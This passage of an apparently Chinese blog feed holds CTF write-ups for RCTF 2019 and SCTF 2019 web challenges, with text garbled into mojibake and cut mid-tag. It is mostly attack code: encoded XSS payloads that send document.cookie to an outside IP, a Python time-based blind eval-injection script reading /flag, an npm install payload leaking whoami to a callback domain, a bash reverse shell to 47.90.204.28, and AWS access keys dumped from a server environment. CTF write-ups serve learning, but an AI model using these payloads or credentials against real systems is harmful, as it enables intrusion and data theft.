$&#123;resp.message&#125;`</span><br><span class="line">&#125;</span><br><span class="line">document.body.children[0].innerHTML = html</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨å‰é¢å¾—åˆ°çš„jsonp tipsæµ‹è¯•ä¸€ä¸‹</p><p><img src="https://ae01.alicdn.com/kf/Ha3a3e6515e6f4ec282b818dbc3b68637H.png" alt></p><p>ç›®æ ‡æ˜ç¡®å°±æ˜¯æµ‹è¿™ä¸ªæ¥å£çš„xssï¼Œä½†æ˜¯ç”±äºè¿™ä¸ª<code>content-type: application/json</code>è¿›è¡Œé™åˆ¶ï¼Œæ‰€ä»¥ä¸ä¼šè§£ææ ‡ç­¾çš„<br><img src="https://ae01.alicdn.com/kf/Hef97f434b64f4dc793daae9ce0739e6eO.png" alt></p><p>ç¥å¥‡çš„æ˜¯è¿™é‡Œè¿˜å­˜åœ¨v1ç‰ˆæœ¬çš„æ¥å£ï¼Œçœ‹æ¥ä»¥åè¦å¤šè¯•è¯•ã€‚è¿™æ¬¡<code>content-type: text/html; charset=UTF-8</code>å°±å¯ä»¥è§£æäº†ã€‚</p><p><img src="https://ae01.alicdn.com/kf/Hb3b0de4b06b64245a3223f337dbafec0J.png" alt></p><p>å¨œç¾æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘å¸¸è§„çš„ï¼Œé€šè¿‡è¿™ä¸ªæ¥å£æ¥ç”¨XSSæ‰“åˆ°cookie</p><p>ä½†æ˜¯å‘ç°ä¼šè¢«è½¬ä¹‰ä¸º&lt;\/script&gt;</p><p><img src="https://ae01.alicdn.com/kf/H54bfba52636c40419cf45ad29047640cz.png" alt></p><p>æ‰€ä»¥æ¥ä¸‹é‡Œä½¿ç”¨htmlç¼–ç æ¥æ··æ·†ä¸€ä¸‹paylaod</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://rblog.2019.rctf.rois.io/api/v1/posts?callback</span>=<span class="string">alert(1);console.log</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#114;&amp;#98;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#50;&amp;#48;&amp;#49;&amp;#57;&amp;#46;&amp;#114;&amp;#99;&amp;#116;&amp;#102;&amp;#46;&amp;#114;&amp;#111;&amp;#105;&amp;#115;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#97;&amp;#112;&amp;#105;&amp;#47;&amp;#118;&amp;#49;&amp;#47;&amp;#112;&amp;#111;&amp;#115;&amp;#116;&amp;#115;&amp;#63;&amp;#99;&amp;#97;&amp;#108;&amp;#108;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#61;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#111;&amp;#108;&amp;#101;&amp;#46;&amp;#108;&amp;#111;&amp;#103;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br></pre></td></tr></table></figure><p>urlencodeä¹‹åçš„paylaod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc%3D%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure></p><p>æˆåŠŸè§¦å‘å¼¹çª—</p><p><img src="https://ae01.alicdn.com/kf/H01cadf80b51f4201a04864a7daf24b30B.png" alt></p><p>ä½†æ˜¯chromeä¸Šçš„XSS Auditorå°±ä¼šè¿›è¡Œæ‹¦æˆª<br><img src="https://ae01.alicdn.com/kf/Hff577bdc8f114c5b83251aa34ab54a34M.png" alt></p><p>æ‰€ä»¥æ¥ä¸‹é‡Œå°±æ˜¯å¯¹æ¥å£çš„fuzzï¼Œfuzzçš„ç›®æ ‡å¦‚ä¸‹:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/&#123;fuzz_this_point&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€åæ²¡æƒ³åˆ°ä¼šæ˜¯ä¸­æ–‡çš„æ ‡ç‚¹ï¼Œæ‰€ä»¥å°±åˆ©ç”¨ã€‚å·å»è¿›ä¸€æ­¥æ··æ·†paylaod<br><img src="https://ae01.alicdn.com/kf/Ha6c2affd6bc64dcab4d8e6e10252aa3bz.png" alt></p><p>æœ€ç»ˆä½¿ç”¨å¦‚ä¸‹payload1æ‰“åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%E3%80%82%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%2352%3B%26%2355%3B%26%2346%3B%26%2357%3B%26%2348%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2352%3B%26%2346%3B%26%2350%3B%26%2356%3B%26%2358%3B%26%2350%3B%26%2350%3B%26%2351%3B%26%2351%3B%26%2347%3B%26%2339%3B%26%2343%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2359%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/H1a25876edb844b8081fc3430928bc5c6V.png" alt></p><h2 id="0x05-ez4cr"><a href="#0x05-ez4cr" class="headerlink" title="0x05 ez4cr"></a>0x05 ez4cr</h2><p>ä»æºä»£ç ä¸­çœ‹åˆ°ä¸€ä¸ª<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//report-rblog.2019.rctf.rois.io/report.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> $ = <span class="built_in">document</span>.querySelector.bind(<span class="built_in">document</span>);</span><br><span class="line">$(<span class="string">'button'</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> flag = <span class="keyword">new</span> URLSearchParams();</span><br><span class="line">  flag.append(<span class="string">'g-recaptcha-response'</span>, $(<span class="string">'.g-recaptcha-response'</span>).value);</span><br><span class="line">  flag.append(<span class="string">'url'</span>, $(<span class="string">'input[id=url]'</span>).value);</span><br><span class="line">  axios.post(<span class="string">'/report.php'</span>, flag).then(<span class="function"><span class="params">resp</span>=&gt;</span>&#123;</span><br><span class="line">    alert(resp.data.status)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä»ä¸­æ‰¾åˆ°ä¸€ä¸ªæ¥å£<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php</span><br></pre></td></tr></table></figure></p><p>çœ‹åˆ°è¯·æ±‚çš„å“åº”ä¸­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content-type</span><br><span class="line">text/html; charset=UTF-8</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥ä½¿ç”¨jsonpçš„æ–¹å¼ç»§ç»­ç»§ç»­è¿›è¡Œæµ‹è¯•<br><img src="https://ae01.alicdn.com/kf/H820fa7801acc450fad77ec7b1c502c8bz.png" alt><br>å‘ç°å¦‚ä¸‹æµ‹è¯•æœ‰æ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%3E</span><br></pre></td></tr></table></figure><p><img src="RCTF.resources/DE01678E-8BB0-4881-A468-2A7132E5E1C2.png" alt="313affe25cd9c468e57b62c7d0f16684"></p><p>å› æ­¤æ„é€ ä¸€ä¸ªpayloadç±»ä¼¼ä¸Šé¢˜çš„paylaodåœ¨firefoxæˆåŠŸå¼¹çª—<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%20src=https://report-rblog.2019.rctf.rois.io/report.php?callback=alert(1);console.log%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><p><img src="https://ae01.alicdn.com/kf/H3b05fb7cd8a04898a4ed4442f7409f8fu.png" alt><br>ä½†æ˜¯chromeä¾æ—§ä¼šè¢«Xss Auditoræ‹¦æˆª</p><p>æ‰€ä»¥éœ€è¦å¯¹payloadè¿›è¡Œå¤„ç†ï¼Œä½¿ç”¨fuzzè¿›è¡Œå¤„ç†ï¼Œæœ€åå‘ç°åœ¨CDNçš„åŠ©æ”»ä¸‹å¯ä»¥ç›´æ¥æ‰“åˆ°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://report-rblog.2019.rctf.rois.io/report.php?callback=%3Cscript%20src=http://report-rblog.2019.rctf.rois.io/report.php?callback=alert(1);console.log%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><p><img src="https://ae01.alicdn.com/kf/H1b322663f39748aa973afb7a2ea05593s.png" alt></p><p>ä»¥ä¸Šæ˜¯éé¢„æœŸè§£ï¼ŒåŸå› æ˜¯payloadåœ¨ç»è¿‡Cloudflare CDNå¤„ç†ä¹‹åå¯¹åè®®è¿›è¡Œäº†upgradeä»è€Œå¯¼è‡´bypass chrome xss audit</p><p><img src="https://ae01.alicdn.com/kf/H2bc5a26629934cc88479df384ac1a406L.png" alt></p><h2 id="0x06-calcalcalc"><a href="#0x06-calcalcalc" class="headerlink" title="0x06 calcalcalc"></a>0x06 calcalcalc</h2><p>çœ‹åˆ°é¢˜ç›®è®¡ç®—å™¨åç«¯ä¸‰ç§è®¡ç®—ç»“æœæ¯”è¾ƒï¼Œäº†è§£åˆ°æ˜¯æ‹Ÿæ€æ‰‹æ®µï¼Œé‚£ä¹ˆå°±åªèƒ½ä»æ—¶é—´å·®ä¸Šä¸‹æ‰‹ã€‚ä¸‰ç§è®¡ç®—ï¼Œå°†ç”±æœ€åä¸€ä¸ªå†³å®šç»“æœæ˜¯ä»€ä¹ˆã€‚</p><ol><li>bypass å­—ç¬¦é•¿åº¦é™åˆ¶</li></ol><p>åˆ©ç”¨Nestjs + expressjsæ”¯æŒjsonçš„ç‰¹æ€§æ¥ä¼ payloadå¹¶å°†isVipè®¾ä¸ºtrueè€Œä¸æ˜¯â€™trueâ€™</p><ol start="2"><li>æ—¶é—´ç›²æ³¨è„šæœ¬</li></ol><p>ä½¿ç”¨çš„payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;time&apos;).sleep(3) if ord(open(&apos;/flag&apos;).read()[3]) &gt; 67 else</span><br></pre></td></tr></table></figure></p><p>å› ä¸ºå­—ç¬¦é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æ··æ·†ä¸€ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(116)+chr(105)+chr(109)+chr(101)+chr(39)+chr(41)+chr(46)+chr(115)+chr(108)+chr(101)+chr(101)+chr(112)+chr(40)+chr(51)+chr(41)+chr(32)+chr(105)+chr(102)+chr(32)+chr(111)+chr(114)+chr(100)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(91)+chr(51)+chr(93)+chr(41)+chr(32)+chr(62)+chr(32)+chr(54)+chr(55)+chr(32)+chr(101)+chr(108)+chr(115)+chr(101)+chr(32)+chr(78)+chr(111)+chr(110)+chr(101))</span><br></pre></td></tr></table></figure></p><p>ä¹‹åä½¿ç”¨è„šæœ¬è‡ªåŠ¨åŒ–å»å¤„ç†ï¼Œè„šæœ¬ä¸­çš„ä¸»è¦å‘ç‚¹æ˜¯åœ¨å¤„ç†jsonä¸Šï¼Œå¡äº†å¥½ä¹…ã€‚ä¹‹årequestsåº“åŸæ¥å¯ä»¥è‡ªå·±è®¡ç®—å»¶æ—¶æ—¶é—´ï¼Œä¸éœ€è¦timeåº“äº†ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'eval(chr('</span> + <span class="string">')+chr('</span>.join(str(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> cmd) + <span class="string">'))'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.90.204.28:8082/calculate'</span></span><br><span class="line">sess = Session()</span><br><span class="line">sess.headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">calc_modal = &#123;<span class="string">'expression'</span>: <span class="string">'1+1'</span>, <span class="string">'isVip'</span>: <span class="literal">True</span>&#125;</span><br><span class="line"><span class="comment"># print(json.dumps(calc_modal))  # json.dumpsä¹‹åTrueå°±å˜trueäº†</span></span><br><span class="line"><span class="comment"># print(sess.post(url, data=json.dumps(calc_modal)).elapsed.total_seconds())  # &lt;2s</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    low, high = <span class="number">0</span>, <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print(hex(mid)[2:].zfill(2),end='\r')</span></span><br><span class="line">        cmd = <span class="string">f"__import__('time').sleep(5) if ord(open('/flag').read()[<span class="subst">&#123;i&#125;</span>]) == <span class="subst">&#123;mid&#125;</span> else None"</span></span><br><span class="line">        cmd_encoded = encode_cmd(cmd)</span><br><span class="line">        calc_modal[<span class="string">'expression'</span>] = cmd_encoded</span><br><span class="line">        elapsed = sess.post(url, data=json.dumps(calc_modal))</span><br><span class="line">        <span class="comment"># print(elapsed.text)</span></span><br><span class="line">        elapsed = elapsed.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> elapsed &gt; <span class="number">4.5</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cmd = <span class="string">f"__import__('time').sleep(5) if ord(open('/flag').read()[<span class="subst">&#123;i&#125;</span>]) &gt; <span class="subst">&#123;mid&#125;</span> else None"</span></span><br><span class="line">        cmd_encoded = encode_cmd(cmd)</span><br><span class="line">        calc_modal[<span class="string">'expression'</span>] = cmd_encoded</span><br><span class="line">        elapsed = sess.post(url, data=json.dumps(calc_modal))</span><br><span class="line">        <span class="comment"># print(elapsed.text)</span></span><br><span class="line">        elapsed = elapsed.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> elapsed &gt; <span class="number">4.5</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    print()</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="keyword">if</span> chr(mid) == <span class="string">'&#125;'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>å‚è€ƒï¼š<br><a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/rctf2019/calcalcalc/readme.md" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/blob/master/rctf2019/calcalcalc/readme.md</a></p><p><a href="http://blog.leanote.com/post/xp0int/%5BWeb%5D-4" target="_blank" rel="noopener">http://blog.leanote.com/post/xp0int/%5BWeb%5D-4</a></p><p>ç¯å¢ƒï¼š<br><a href="https://github.com/CTFTraining/rctf_2019_calcalcalc" target="_blank" rel="noopener">https://github.com/CTFTraining/rctf_2019_calcalcalc</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;å­¦åˆ°äº†å¥½å¤š&lt;/p&gt;
&lt;h2 id=&quot;0x01-nextphp&quot;&gt;&lt;a href=&quot;#0x01-nex
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 sctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/14/2019-sctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/14/2019-sctf-writeup/</id>
    <published>2019-09-14T15:40:40.000Z</published>
    <updated>2019-09-14T15:47:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åšé¢˜æœ€å¤šï¼Œä½†æ˜¯wpæœ€ç®€ç•¥å’Œä¸å…¨çš„ä¸€æ¬¡ï¼Œ:)</p><h2 id="0x01-easy-php"><a href="#0x01-easy-php" class="headerlink" title="0x01 easy-php"></a>0x01 easy-php</h2><p><a href="https://sctf2019.l0ca1.xyz/static/js/app.51c756bc2bea67226d9b.js" target="_blank" rel="noopener">https://sctf2019.l0ca1.xyz/static/js/app.51c756bc2bea67226d9b.js</a><br>å…ˆä»æºä»£ç ä¸­çœ‹ä¸€ä¸‹è·¯ç”±ä¿¡æ¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/main</span><br><span class="line">/login</span><br><span class="line">/upload</span><br></pre></td></tr></table></figure></p><p>ä¹‹åå‘ç°ç›´æ¥è®¿é—®mainè·¯ç”±ï¼Œè¿™ä¸ªç™»å½•æ˜¯å¯ä»¥ç»•è¿‡çš„</p><p><img src="https://i.loli.net/2019/09/14/etkgfl3LJazTqdO.png" alt="7CB4FEEA-4CF6-4392-A959-4EB9F2814F80.png"></p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚ä½•å¯¹jsè¿›è¡Œä¿®æ”¹ï¼Œæ–¹æ³•å¦‚ä¸‹</p><p>é¦–å…ˆåœ¨burpä¸­è®¾ç½®ä¸€ä¸‹<br><img src="https://i.loli.net/2019/09/14/6GLMNmSg4nZi29y.png" alt="44D07737-29D7-44DE-8F9D-8DA42A080754.png"></p><p>ä¹‹åä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…å¹¶æ³¨æ„ç‚¹å‡»å¦‚ä¸‹é€‰é¡¹å³å¯<br><img src="https://i.loli.net/2019/09/14/CtonbS9hX5ivu48.png" alt="BBD70930-9E38-45E5-8974-523460096D51.png"></p><p>ä¹‹åå°±å¯ä»¥å¯¹å“åº”åŒ…è¿›è¡Œä¿®æ”¹äº†ï¼ŒæŠŠå¯¹åº”çš„<code>requireLogin: !0</code>ä¿®æ”¹ä¸º<code>requireLogin: 0</code></p><p>ä¹‹åè®¿é—®åˆ°mainç•Œé¢</p><p><img src="https://i.loli.net/2019/09/14/TMz692iRFyEpmAP.png" alt="4D1E33FE-2090-4F4B-A776-94CDBCDFE3B9.png"></p><p>ä¹‹åæŸ¥åˆ°npmæ”¯æŒè¿œç¨‹å®‰è£…ä»è€Œå¯ä»¥é€ æˆrce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;abcdefghiklmn123&quot;,&quot;npm&quot;:[&quot;jquery&quot;,&quot;http://`whoami`.bjslfd.ceye.io/z3.git&quot;]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/xf6DbzEMq7cjmB9.png" alt="0233E12F-2439-44DF-8113-B36A22FD7706.png"></p><p><img src="https://i.loli.net/2019/09/14/DNLXEaqwBjRlohU.png" alt="71ED3664-9834-4AA5-A705-480AE1FC5BD9.png"></p><p>ä¹‹åç›´æ¥åå¼¹ä¸€ä¸ªshellå›æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.90.204.28/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/14/egrsZyBTfDP81iH.png" alt="AC296199-4744-4BCA-9292-C1D9CA19CE4F.png"><br>çœ‹åˆ°awså°±è”æƒ³åˆ°s3çš„ä¸€äº›é—®é¢˜<br><img src="https://i.loli.net/2019/09/14/9o3fQkntCjFe7H5.png" alt="88C2DC65-3136-496A-88F2-87D11B085355.png"></p><p>ä»æœ¬åœ°ç¯å¢ƒå˜é‡è¯»å–åˆ°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AWS_ACCESS_KEY_ID=ASIA5CRTL2SNLRLBSRMQ</span><br><span class="line">AWS_SECRET_ACCESS_KEY=QuqbcP2cl6uAPkSDH7qSP3bSMqHk7IwKVBTUhhn2</span><br><span class="line">AWS_REGION=ap-northeast-1</span><br><span 